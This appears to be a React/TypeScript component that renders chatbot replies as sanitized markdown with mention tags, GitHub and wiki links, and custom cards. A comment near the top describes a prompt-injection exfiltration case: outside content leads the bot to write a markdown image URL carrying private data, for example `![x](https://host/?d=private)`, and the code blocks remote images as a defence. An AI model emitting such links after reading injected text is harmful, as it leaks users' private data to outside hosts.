import { Link } from "@tanstack/react-router";
import { createElement, memo, useContext, useMemo, type ReactNode } from "react";
import { defaultRehypePlugins, Streamdown } from "streamdown";

import { splitReply, UI_FENCE } from "@zetta/render/reply";
import { cn } from "@zetta/ui/lib/utils";
import { BotsContext } from "@/components/bot-identity";
import { BotTag } from "@/components/bot-tag";
import { MentionTag } from "@/components/mention-tag";

import { RELATION } from "@/features/wiki/wiki-api";
import type { Relation } from "@/features/wiki/wiki-api";
import { rehypeWikiLinks } from "@/features/wiki/wiki-markdown";
import { rehypeBotTags } from "./bot-tags";
import { rehypeGithubRefs } from "./github-refs";
import { rehypeMentionLinks } from "./mention-tags";
import { tagPatches } from "./code-fence";
import { codePlugins } from "./highlighted-code";
import { InboundCard } from "./inbound-card";
import { parseInboundCard } from "./inbound-card-data";
import { SetupCard } from "./setup-card";
import { parseSetupCard } from "./setup-card-data";
import { stripToolFences } from "./tool-fences";
import { UiSkeleton, UiView } from "./ui-registry";
import { parseWhatsapp, WhatsappView } from "./whatsapp-view";

/**
 * Streamdown's sanitize step drops a link whose protocol it does not know. A mention is the link `[@Dev](bot:<id>)` (`team:` and `room:`
 * too), so those protocols are allowed here and `rehypeMentionLinks` turns them into tags.
 */
const [sanitizer, sanitizeSchema] = defaultRehypePlugins.sanitize as unknown as [
  unknown,
  { protocols?: { href?: string[] } } & Record<string, unknown>,
];
const withMentionProtocols = {
  ...defaultRehypePlugins,
  sanitize: [
    sanitizer,
    {
      ...sanitizeSchema,
      protocols: {
        ...sanitizeSchema.protocols,
        href: [...(sanitizeSchema.protocols?.href ?? []), "bot", "team", "room"],
      },
    },
  ] as unknown as typeof defaultRehypePlugins.sanitize,
};

const BODY = "chat-response min-w-0 [&>*:first-child]:mt-0 [&>*:last-child]:mb-0";

/**
 * A reply can carry text from outside (a web page, an email) that makes the bot write `![x](https://host/?d=private)`; drawing the
 * image would send that request as soon as the reply renders. Show the alt text instead.
 */
const NO_REMOTE_IMAGES = {
  img: ({ alt }: { alt?: string | undefined }) =>
    alt ? <span className="text-muted-foreground">[{alt}]</span> : null,
};

/** A GitHub issue, pull request or commit named in a reply (see github-refs). It leaves the app, so it is a plain link. */
function GithubRef({ children, ...props }: { children?: ReactNode }) {
  const href = String((props as Record<string, unknown>)["data-href"] ?? "");
  if (!href.startsWith("https://github.com/")) return <span>{children}</span>;
  return (
    <a
      href={href}
      target="_blank"
      rel="noopener noreferrer"
      className="link rounded-md bg-muted px-1 font-mono text-[0.9em] whitespace-nowrap text-primary [box-decoration-break:clone] hover:bg-primary/10 focus-visible:outline-2 focus-visible:outline-ring"
    >
      {children}
    </a>
  );
}

/** What a `[[slug]]` of a text points to: the item's title when it exists. `undefined` for a slug nothing has. */
export type WikiLinkInfo = (slug: string) => { title: string } | undefined;

const WIKI_LINK =
  "link rounded-md bg-muted px-1 text-[0.95em] text-primary hover:bg-primary/10 focus-visible:outline-2 focus-visible:outline-ring";

/** A wiki item named in a text, drawn as a router link; one that does not exist links to the page that creates it. */
function WikiRef({ info, ...props }: { info: WikiLinkInfo; children?: ReactNode }) {
  const p = props as Record<string, unknown>;
  const slug = String(p["data-slug"] ?? ""),
    relation = String(p["data-relation"] ?? "related") as Relation;
  const hit = info(slug);
  const prefix = relation === "related" ? "" : `${RELATION[relation]} `;
  return hit ? (
    <Link to="/wiki/$slug" params={{ slug }} className={WIKI_LINK}>
      {prefix}
      {hit.title}
    </Link>
  ) : (
    <Link
      to="/wiki"
      search={{ create: slug } as never}
      className="rounded-md px-1 text-muted-foreground underline decoration-dotted"
    >
      {slug} (missing)
    </Link>
  );
}

const Markdown = memo(function Markdown({
  text,
  streaming,
  className,
  repo,
  wikiLinks,
}: {
  text: string;
  streaming: boolean;
  className?: string | undefined;
  repo?: string | undefined;
  wikiLinks?: WikiLinkInfo | undefined;
}) {
  const bots = useContext(BotsContext);
  // Bot names and GitHub references become tags and links. Our plugins run after the default ones (sanitize included), so their elements are not stripped.
  const { rehypePlugins, components } = useMemo(() => {
    const list = [...bots.values()];
    return {
      rehypePlugins: [
        ...Object.values(withMentionProtocols),
        rehypeMentionLinks,
        rehypeGithubRefs(repo),
        ...(wikiLinks ? [rehypeWikiLinks] : []),
        ...(list.length ? [rehypeBotTags(list)] : []),
      ],
      components: {
        ...NO_REMOTE_IMAGES,
        "gh-ref": GithubRef,
        "mention-tag": (props: { children?: ReactNode }) => <MentionTag bots={bots} {...props} />,
        ...(wikiLinks && {
          "wiki-link": (props: { children?: ReactNode }) => <WikiRef info={wikiLinks} {...props} />,
        }),
        ...(list.length && {
          "bot-tag": ({ children, ...props }: { children?: ReactNode }) => {
            const bot = bots.get(String((props as Record<string, unknown>)["data-bot-id"]));
            return bot ? (
              <BotTag bot={bot}>{children}</BotTag>
            ) : (
              createElement("span", null, children)
            );
          },
        }),
      },
    };
  }, [bots, repo, wikiLinks]);
  return (
    <Streamdown
      mode={streaming ? "streaming" : "static"}
      rehypePlugins={rehypePlugins}
      isAnimating={streaming}
      parseIncompleteMarkdown={streaming}
      className={cn(BODY, className)}
      components={components}
      plugins={codePlugins}
    >
      {tagPatches(text)}
    </Streamdown>
  );
});

/**
 * Message body. Markdown goes through Streamdown, which tolerates half-written syntax while a reply streams; fenced `zetta:ui`
 * blocks are drawn by json-render from the shared catalog (a block that never validates is shown as the code it is).
 */
const CARD = /```zetta:(whatsapp|setup-card|inbound-card)\s*\n([\s\S]*?)```/g;

export const Response = memo(function Response({
  text: raw,
  streaming = false,
  className,
  repo,
  wikiLinks,
}: {
  text: string;
  streaming?: boolean;
  className?: string;
  /** `owner/repo` the `#12` and commit ids of this text belong to. */
  repo?: string | undefined;
  /** Turns `[[slug]]` into links to the wiki item. Chat leaves it out and shows the text as written. */
  wikiLinks?: WikiLinkInfo | undefined;
}) {
  const text = streaming ? stripToolFences(raw) : raw;
  const whatsapp = !streaming && /```zetta:(whatsapp|setup-card|inbound-card)/.test(text);
  // Hooks stay above the early return (a reply can flip to the WhatsApp view when it settles). A reply with no ui fence skips the parse on every chunk.
  const segments = useMemo(
    () => (whatsapp || !text.includes("```" + UI_FENCE) ? [] : splitReply(text, streaming)),
    [text, streaming, whatsapp],
  );
  if (whatsapp) {
    const parts: {
      md?: string;
      wa?: ReturnType<typeof parseWhatsapp>;
      setup?: ReturnType<typeof parseSetupCard>;
      inbound?: ReturnType<typeof parseInboundCard>;
      raw?: string;
    }[] = [];
    let last = 0;
    for (const m of text.matchAll(CARD)) {
      if (m.index! > last) parts.push({ md: text.slice(last, m.index) });
      parts.push(
        m[1] === "setup-card"
          ? { setup: parseSetupCard(m[2]!), raw: m[2]! }
          : m[1] === "inbound-card"
            ? { inbound: parseInboundCard(m[2]!), raw: m[2]! }
            : { wa: parseWhatsapp(m[2]!), raw: m[2]! },
      );
      last = m.index! + m[0].length;
    }
    if (last < text.length) parts.push({ md: text.slice(last) });
    return (
      <div className={cn("flex min-w-0 flex-col gap-2", className)}>
        {parts.map((p, i) =>
          p.md !== undefined ? (
            p.md.trim() ? (
              <Response key={i} text={p.md} repo={repo} />
            ) : null
          ) : p.setup ? (
            <SetupCard key={i} data={p.setup} />
          ) : p.inbound ? (
            <InboundCard key={i} data={p.inbound} />
          ) : p.wa ? (
            <WhatsappView key={i} data={p.wa} />
          ) : (
            <Markdown key={i} text={`\`\`\`json\n${p.raw}\n\`\`\``} streaming={false} />
          ),
        )}
      </div>
    );
  }
  if (segments.every((s) => s.kind === "markdown"))
    return (
      <Markdown
        text={text}
        streaming={streaming}
        className={className}
        repo={repo}
        wikiLinks={wikiLinks}
      />
    );
  return (
    <div className={cn("flex min-w-0 flex-col gap-2", className)}>
      {segments.map((s, i) =>
        s.kind === "markdown" ? (
          <Markdown
            key={i}
            text={s.text}
            streaming={streaming && i === segments.length - 1}
            repo={repo}
            wikiLinks={wikiLinks}
          />
        ) : s.spec ? (
          <UiView key={i} spec={s.spec} streaming={!s.complete} />
        ) : s.complete ? (
          <Markdown key={i} text={`\`\`\`json\n${s.raw}\n\`\`\``} streaming={false} />
        ) : (
          <UiSkeleton key={i} />
        ),
      )}
    </div>
  );
});
